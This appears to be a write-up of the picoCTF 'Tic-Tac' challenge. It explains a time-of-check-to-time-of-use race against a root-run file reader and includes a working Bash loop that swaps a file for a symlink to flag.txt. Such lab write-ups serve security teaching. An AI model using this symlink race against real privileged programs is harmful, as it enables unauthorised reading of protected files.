# picoCTF Tic-Tac

The challenge description informs us that the file runs with root privileges and can read other files owned by us.

After reviewing the source code, it becomes clear that we can exploit a **TocTou attack** (Time of Check to Time of Use). Essentially, the program checks whether we own a file. If we do, it outputs the file's content. By altering the file at the right moment, we can bypass the ownership check and replace the file with something else—for example, a symbolic link to `flag.txt`. Since the `txtreader` program runs as root, it can read the `flag.txt` file.

### The Bash Script Exploit

I created a simple Bash script to perform this attack:

```
#!/bin/bash

FILE=/home/ctf-player/attack

for i in {1..200};

do

if [ -L "$FILE" ]; then
	rm "$FILE"
fi
echo "TEST" >> "$FILE"

./txtreader "$FILE" &
rm "$FILE"
ln -s flag.txt "$FILE"
done
```

This script performs the following steps:

1. Checks if there is a symbolic link named `attack`. If it exists, it deletes the link.
2. Creates a regular file named `attack` and writes the word "TEST" to it.
3. Runs the `txtreader` program with `attack` as its argument.
4. Deletes the file `attack` and replaces it with a symbolic link pointing to `flag.txt`.

These steps are repeated multiple times in a loop, creating a race condition.

### Execution

To execute this exploit, I log into the instance via SSH, create the Bash script using `nano`, and run the script. It may take a few attempts (Took me around 15 trys), but this method reliably retrieves the flag.
